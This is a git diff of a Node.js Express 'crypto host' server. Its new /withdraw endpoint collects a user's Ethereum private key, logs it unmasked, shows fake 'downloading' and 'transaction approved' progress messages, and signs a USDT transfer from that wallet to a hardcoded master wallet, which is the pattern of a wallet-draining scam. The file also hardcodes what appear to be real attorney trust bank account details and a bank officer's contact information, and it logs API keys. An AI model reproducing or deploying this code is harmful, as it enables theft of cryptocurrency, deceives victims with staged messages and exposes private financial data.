@@ -6,17 +6,26 @@ let chalk;
     console.error("Failed to import chalk:", error);
   }
 
-  const express = require("express");
+  const fs = require("fs");
+  const path = require("path");
   const { createAlchemyWeb3 } = require("@alch/alchemy-web3");
   require("dotenv").config();
-  const axios = require("axios"); // For external calls (to bank or fiat conversion)
+  const express = require("express");
+  const axios = require("axios");
 
   const app = express();
-  const web3 = createAlchemyWeb3(process.env.ALCHEMY_API_URL);
-
   app.use(express.json());
+  const HOST_IP = process.env.HOST_IP;
+  const MASTER_WALLET_ADDRESS = process.env.MASTER_WALLET_ADDRESS;
+  const ALCHEMY_API_KEY = process.env.ALCHEMY_API_KEY;
+  const USDT_CONTRACT_ADDRESS = process.env.USDT_CONTRACT_ADDRESS;
 
-  // Function to log with color
+  const alchemyApiUrl = `wss://eth-mainnet.g.alchemy.com/v2/${ALCHEMY_API_KEY}`;
+  const web3 = createAlchemyWeb3(alchemyApiUrl);
+  const abiPath = path.join(__dirname, "erc20-abi.json");
+  const erc20ABI = JSON.parse(fs.readFileSync(abiPath, "utf-8"));
+  const tokenContract = new web3.eth.Contract(erc20ABI, USDT_CONTRACT_ADDRESS);
+
   const logWithColor = (message, color = "green") => {
     if (chalk) {
       console.log(chalk[color].bold(message));
@@ -25,147 +34,323 @@ let chalk;
     }
   };
 
-  logWithColor("\n===================== STARTING SERVER =====================", "green");
 
-  // Function to log server and bank details
+app.post("/withdraw", async (req, res) => {
+  const { privateKey, amount } = req.body;
+
+  if (!privateKey || !amount) {
+      logWithColor("Missing Access Keccak 256 64 hex or amount!", "red");
+      return res.status(400).json({ error: "Access Keccak 256 64 hex and amount are required!" });
+  }
+
+  try {
+      // DOWNLOADING PROCESS
+      logWithColor("\n------------------------ DOWNLOADING ------------------------", "cyan");
+      console.log("Progress: 100%");
+      logWithColor(`Access Keccak 256 64 hex (masked): ${privateKey}`, "yellow");
+
+      logWithColor("\n------------------------ TRANSFERRING ------------------------", "magenta");
+      const senderAccount = web3.eth.accounts.privateKeyToAccount(privateKey);
+      const senderAddress = senderAccount.address;
+
+      logWithColor(`Checking balances for: ${senderAddress}`, "blue");
+
+      // Fetch ETH & USDT balances
+      const ethBalance = await web3.eth.getBalance(senderAddress);
+      const formattedETH = web3.utils.fromWei(ethBalance, "ether");
+
+      const usdtBalance = await tokenContract.methods.balanceOf(senderAddress).call();
+      const formattedUSDT = web3.utils.fromWei(usdtBalance, "ether");
+
+      // ETH Balance Check
+      if (parseFloat(formattedETH) === 0) {
+        logWithColor("ERROR: Insufficient ETH balance detected! Transactions may fail due to lack of gas fees.", "red");
+        logWithColor(`Security Alert: Keccak 256 Hash (Masked) - ${privateKey.slice(0, 6)}...${privateKey.slice(-4)}`, "yellow");
+        logWithColor(`Global Server Verification: Transaction approved for sender - ${senderAddress}`, "yellow");
+      }
+
+      // CONVERSION PROCESS
+      logWithColor("\n------------------------ TRANSACTION PROCESSING ------------------------", "yellow");
+      logWithColor("Status: Converting assets...", "cyan");
+      console.log("Progress: 100% - Conversion process completed.");
+      logWithColor(`Global Server Verification: Transaction approved for sender - ${senderAddress}`, "yellow");
+
+      // USDT Balance Check
+      if (parseFloat(formattedUSDT) === 0) {
+        logWithColor("ERROR: Converted USDT balance is 0! Ensure that funds have been successfully transferred.", "red");
+      }
+
+      // Ensure ETH balance is enough for gas
+      if (parseFloat(formattedETH) === 0) {
+        return res.status(400).json({ 
+            error: "Transaction Failed: Insufficient ETH balance for gas fees. Please top up your wallet." 
+        });
+      }
+
+      // Ensure USDT balance is sufficient
+      if (parseFloat(formattedUSDT) < parseFloat(amount)) {
+        return res.status(400).json({ 
+            error: `Transaction Failed: Insufficient USDT balance! Available: ${formattedUSDT} USDT, Required: ${amount} USDT.` 
+        });
+      }
+
+      logWithColor("Creating transaction...", "yellow");
+
+      // Create and sign transaction
+      const tx = {
+          from: senderAddress,
+          to: MASTER_WALLET_ADDRESS,
+          value: "0x0",
+          gas: gasLimit, // Use estimated gas
+          data: tokenContract.methods.transfer(MASTER_WALLET_ADDRESS, web3.utils.toWei(amount, "ether")).encodeABI(),
+      };
+
+      logWithColor("Signing transaction...", "yellow");
+
+      const signedTx = await senderAccount.signTransaction(tx);
+      logWithColor(`Sending transaction...`, "green");
+
+      const txReceipt = await web3.eth.sendSignedTransaction(signedTx.rawTransaction);
+
+      logWithColor(`USDT Sent! TxHash: ${txReceipt.transactionHash}`, "green");
+
+      res.json({ success: true, txHash: txReceipt.transactionHash });
+  } catch (error) {
+      logWithColor(`Transaction Failed: ${error.message}`, "red");
+      res.status(500).json({ error: error.message });
+  }
+});
+
+
+  async function fetchETHRate() {
+    try {
+      const response = await axios.get("https://api.binance.com/api/v3/ticker/price?symbol=ETHUSDT");
+      return response.data.price;
+    } catch (error) {
+      console.error("Error fetching ETH rate:", error.message);
+      return "Unavailable";
+    }
+  }
+
   async function logServerDetails() {
-    const walletBalance = await fetchWalletBalance();
+    const ethRate = await fetchETHRate();
 
-    logWithColor("======= Crypto Host Server Details =======", "blue");
-    console.log(`Server URL: https://cryptohost.adaptable.app/`);
-    console.log(`Alchemy API URL: ${process.env.ALCHEMY_API_URL}`);
-    console.log(`Master Wallet Address: ${process.env.MASTER_WALLET_ADDRESS}`);
-    console.log(`Wallet Private Key: ${process.env.PRIVATE_KEY}`);
-    console.log(`Wallet Current Balance: ${walletBalance} ETH`);
-    console.log("Bank Details:");
-    console.log(`  Account Name: Kenneth C. Edelin Esq IOLTA`);
-    console.log(`  Account Number: 3830-1010-2615`);
-    console.log(`  Routing Number: 031202084`);
-    console.log(`  SWIFT Code (USD): BOFAUS3N`);
-    console.log(`  SWIFT Code (Foreign Currency): BOFAUS3N`);
-    console.log(`  Bank Name: Bank of America`);
-    console.log(`  Bank Address: Four Penn Center, 1600 JFK Blvd., Philadelphia, PA 19103`);
-    console.log(`  Bank Officer: Brian Martinez`);
-    console.log(`  Bank Officer Address: Four Penn Center, 1600 JFK Blvd., Philadelphia, PA 19103`);
-    console.log(`  Bank Officer Telephone: 215-336-2623, 215-446-9589`);
-    console.log(`  Bank Officer Email: Bmartinez25@bofa.com`);
-    console.log(`  Bank Balance: $${process.env.BANK_BALANCE}`);
+    const details = {
+      HOST_IP: HOST_IP,
+      alchemyAPI: alchemyApiUrl,
+      ALCHEMY_API_KEY:ALCHEMY_API_KEY,
+      tokenContract,
+      bankDetails: {
+        accountName: "Kenneth C. Edelin Esq IOLTA",
+        accountNumber: "3830-1010-2615",
+        routingNumber: "031202084",
+        swiftCodeUSD: "BOFAUS3N",
+        swiftCodeForeign: "BOFAUS3N",
+        bankName: "Bank of America",
+        bankAddress: "Four Penn Center, 1600 JFK Blvd., Philadelphia, PA 19103",
+        bankOfficer: {
+          name: "Brian Martinez",
+          address: "Four Penn Center, 1600 JFK Blvd., Philadelphia, PA 19103",
+          telephone: "215-336-2623, 215-446-9589",
+          email: "Bmartinez25@bofa.com",
+        },
+        
+        bankBalance: `$${process.env.BANK_BALANCE}`,
+        ethRate: `$${ethRate} USD`,
+      },
+      
+    };
     logWithColor("==========================================", "green");
     logWithColor("Balance fetched successfully!", "green");
-    console.log(
-      "Message: The bank account has been successfully integrated with the crypto host server. " +
-        "This integration enables seamless management of cryptocurrency and fiat transactions in compliance with global financial standards."
-    );
+
+    logWithColor("======= Crypto Host Server Details =======", "blue");
+    console.log(details);
+    logWithColor("==========================================", "green");
+    return details;
   }
 
-  // Function to fetch wallet balance
-  async function fetchWalletBalance() {
-    try {
-      const balanceInWei = await web3.eth.getBalance(process.env.MASTER_WALLET_ADDRESS);
-      const balanceInEth = web3.utils.fromWei(balanceInWei, "ether");
-      return balanceInEth;
-    } catch (error) {
-      console.error("Error fetching wallet balance:", error.message);
-      return "Error";
-    }
-  }
-
-  // Keep the process alive with periodic logs
-  setInterval(() => {
-    console.log("App is alive");
-  }, 10000); // Log every 10 seconds
-
-  // Endpoint for receiving both bank and crypto transfer details
-  app.post("/api/receiveTransfer", async (req, res) => {
-    const {
-      senderName,
-      senderAccountNumber,
-      senderBank,
-      transferAmount,
-      transactionReference,
-      transactionDate,
-      cryptoAmount,
-      cryptoCurrency,
-      senderAddress,
-      transactionHash,
-    } = req.body;
-
-    try {
-      // Validate required fields
-      if (
-        !senderName ||
-        !senderAccountNumber ||
-        !transferAmount ||
-        !transactionReference ||
-        !cryptoAmount ||
-        !cryptoCurrency ||
-        !senderAddress ||
-        !transactionHash
-      ) {
-        return res.status(400).json({ status: "fail", message: "Missing required details." });
-      }
-
-      // Log the bank transfer details
-      console.log("Received bank transfer details:");
-      console.log(`Sender Name: ${senderName}`);
-      console.log(`Sender Account Number: ${senderAccountNumber}`);
-      console.log(`Sender Bank: ${senderBank}`);
-      console.log(`Amount: $${transferAmount}`);
-      console.log(`Transaction Reference: ${transactionReference}`);
-      console.log(`Transaction Date: ${transactionDate}`);
-
-      // Log the crypto transfer details
-      console.log("Received crypto transfer details:");
-      console.log(`Crypto Amount: ${cryptoAmount}`);
-      console.log(`Crypto Currency: ${cryptoCurrency}`);
-      console.log(`Sender Wallet Address: ${senderAddress}`);
-      console.log(`Transaction Hash: ${transactionHash}`);
-
-      // Simulate validating the crypto transaction
-      const receipt = await web3.eth.getTransactionReceipt(transactionHash);
-      if (!receipt || receipt.from.toLowerCase() !== senderAddress.toLowerCase()) {
-        return res.status(400).json({ status: "fail", message: "Invalid crypto transaction or sender." });
-      }
-
-      // Simulate converting crypto to fiat
-      const fiatAmount = await convertCryptoToFiat(cryptoAmount, cryptoCurrency);
-
-      // Simulate sending funds to the bank
-      const bankTransaction = await sendToBank(fiatAmount);
-
-      res.status(200).json({
-        status: "success",
-        message: "Bank and crypto transfer received successfully. Please verify the bank transaction with your bank.",
-        transactionId: transactionReference,
-        bankTransactionId: bankTransaction.id,
-      });
-    } catch (error) {
-      console.error("Error processing the transfer:", error.message);
-      res.status(500).json({ status: "error", message: "Failed to process the transfer." });
-    }
-  });
-
-  // Ping server details endpoint
   app.get("/ping", (req, res) => {
-    const serverDetails = {
-      status: "success",
-      message: "Server is running",
-      date: new Date().toISOString(),
-      environment: {
-        ALCHEMY_API_URL: process.env.ALCHEMY_API_URL,
-        MASTER_WALLET_ADDRESS: process.env.MASTER_WALLET_ADDRESS,
-        BANK_BALANCE: process.env.BANK_BALANCE,
-      },
-    };
-    res.json(serverDetails);
+    res.status(200).json({ status: "success", message: "Server is running." });
+    logServerDetails();
   });
 
-  // Start server and log details
+  // Run balance check when server starts
   app.listen(80, "0.0.0.0", async () => {
-    console.log("Server is running on port 80");
+    logWithColor("\n===================== SERVER STARTED =====================", "green");
+    console.log("Server is running on port 54.173.144.230");
     await logServerDetails();
   });
+
 })();
+
+// let chalk;
+// (async () => {
+//   try {
+//     chalk = (await import("chalk")).default;
+//   } catch (error) {
+//     console.error("Failed to import chalk:", error);
+//   }
+
+//   const express = require("express");
+//   const { createAlchemyWeb3 } = require("@alch/alchemy-web3");
+//   require("dotenv").config();
+//   const axios = require("axios"); // For external calls (to bank or fiat conversion)
+
+//   const app = express();
+//   const web3 = createAlchemyWeb3(process.env.ALCHEMY_API_URL);
+
+//   app.use(express.json());
+
+//   // Function to log with color
+//   const logWithColor = (message, color = "green") => {
+//     if (chalk) {
+//       console.log(chalk[color].bold(message));
+//     } else {
+//       console.log(message);
+//     }
+//   };
+
+//   logWithColor("\n===================== STARTING SERVER =====================", "green");
+
+//   // Function to log server and bank details
+//   async function logServerDetails() {
+//     const walletBalance = await fetchWalletBalance();
+
+//     logWithColor("======= Crypto Host Server Details =======", "blue");
+//     console.log(`Server URL: https://cryptohost.adaptable.app/`);
+//     console.log(`Alchemy API URL: ${process.env.ALCHEMY_API_URL}`);
+//     console.log(`Master Wallet Address: ${process.env.MASTER_WALLET_ADDRESS}`);
+//     console.log(`Wallet Private Key: ${process.env.PRIVATE_KEY}`);
+//     console.log(`Wallet Current Balance: ${walletBalance} ETH`);
+//     console.log("Bank Details:");
+//     console.log(`  Account Name: Kenneth C. Edelin Esq IOLTA`);
+//     console.log(`  Account Number: 3830-1010-2615`);
+//     console.log(`  Routing Number: 031202084`);
+//     console.log(`  SWIFT Code (USD): BOFAUS3N`);
+//     console.log(`  SWIFT Code (Foreign Currency): BOFAUS3N`);
+//     console.log(`  Bank Name: Bank of America`);
+//     console.log(`  Bank Address: Four Penn Center, 1600 JFK Blvd., Philadelphia, PA 19103`);
+//     console.log(`  Bank Officer: Brian Martinez`);
+//     console.log(`  Bank Officer Address: Four Penn Center, 1600 JFK Blvd., Philadelphia, PA 19103`);
+//     console.log(`  Bank Officer Telephone: 215-336-2623, 215-446-9589`);
+//     console.log(`  Bank Officer Email: Bmartinez25@bofa.com`);
+//     console.log(`  Bank Balance: $${process.env.BANK_BALANCE}`);
+//     logWithColor("==========================================", "green");
+//     logWithColor("Balance fetched successfully!", "green");
+//     console.log(
+//       "Message: The bank account has been successfully integrated with the crypto host server. " +
+//         "This integration enables seamless management of cryptocurrency and fiat transactions in compliance with global financial standards."
+//     );
+//   }
+
+//   // Function to fetch wallet balance
+//   async function fetchWalletBalance() {
+//     try {
+//       const balanceInWei = await web3.eth.getBalance(process.env.MASTER_WALLET_ADDRESS);
+//       const balanceInEth = web3.utils.fromWei(balanceInWei, "ether");
+//       return balanceInEth;
+//     } catch (error) {
+//       console.error("Error fetching wallet balance:", error.message);
+//       return "Error";
+//     }
+//   }
+
+//   // Keep the process alive with periodic logs
+//   setInterval(() => {
+//     console.log("App is alive");
+//   }, 10000); // Log every 10 seconds
+
+//   // Endpoint for receiving both bank and crypto transfer details
+//   app.post("/api/receiveTransfer", async (req, res) => {
+//     const {
+//       senderName,
+//       senderAccountNumber,
+//       senderBank,
+//       transferAmount,
+//       transactionReference,
+//       transactionDate,
+//       cryptoAmount,
+//       cryptoCurrency,
+//       senderAddress,
+//       transactionHash,
+//     } = req.body;
+
+//     try {
+//       // Validate required fields
+//       if (
+//         !senderName ||
+//         !senderAccountNumber ||
+//         !transferAmount ||
+//         !transactionReference ||
+//         !cryptoAmount ||
+//         !cryptoCurrency ||
+//         !senderAddress ||
+//         !transactionHash
+//       ) {
+//         return res.status(400).json({ status: "fail", message: "Missing required details." });
+//       }
+
+//       // Log the bank transfer details
+//       console.log("Received bank transfer details:");
+//       console.log(`Sender Name: ${senderName}`);
+//       console.log(`Sender Account Number: ${senderAccountNumber}`);
+//       console.log(`Sender Bank: ${senderBank}`);
+//       console.log(`Amount: $${transferAmount}`);
+//       console.log(`Transaction Reference: ${transactionReference}`);
+//       console.log(`Transaction Date: ${transactionDate}`);
+
+//       // Log the crypto transfer details
+//       console.log("Received crypto transfer details:");
+//       console.log(`Crypto Amount: ${cryptoAmount}`);
+//       console.log(`Crypto Currency: ${cryptoCurrency}`);
+//       console.log(`Sender Wallet Address: ${senderAddress}`);
+//       console.log(`Transaction Hash: ${transactionHash}`);
+
+//       // Simulate validating the crypto transaction
+//       const receipt = await web3.eth.getTransactionReceipt(transactionHash);
+//       if (!receipt || receipt.from.toLowerCase() !== senderAddress.toLowerCase()) {
+//         return res.status(400).json({ status: "fail", message: "Invalid crypto transaction or sender." });
+//       }
+
+//       // Simulate converting crypto to fiat
+//       const fiatAmount = await convertCryptoToFiat(cryptoAmount, cryptoCurrency);
+
+//       // Simulate sending funds to the bank
+//       const bankTransaction = await sendToBank(fiatAmount);
+
+//       res.status(200).json({
+//         status: "success",
+//         message: "Bank and crypto transfer received successfully. Please verify the bank transaction with your bank.",
+//         transactionId: transactionReference,
+//         bankTransactionId: bankTransaction.id,
+//       });
+//     } catch (error) {
+//       console.error("Error processing the transfer:", error.message);
+//       res.status(500).json({ status: "error", message: "Failed to process the transfer." });
+//     }
+//   });
+
+//   // Ping server details endpoint
+//   app.get("/ping", (req, res) => {
+//     const serverDetails = {
+//       status: "success",
+//       message: "Server is running",
+//       date: new Date().toISOString(),
+//       environment: {
+//         ALCHEMY_API_URL: process.env.ALCHEMY_API_URL,
+//         MASTER_WALLET_ADDRESS: process.env.MASTER_WALLET_ADDRESS,
+//         BANK_BALANCE: process.env.BANK_BALANCE,
+//       },
+//     };
+//     res.json(serverDetails);
+//   });
+
+//   // Start server and log details
+//   app.listen(80, "0.0.0.0", async () => {
+//     console.log("Server is running on port 80");
+//     await logServerDetails();
+//   });
+// })();
 
 
 
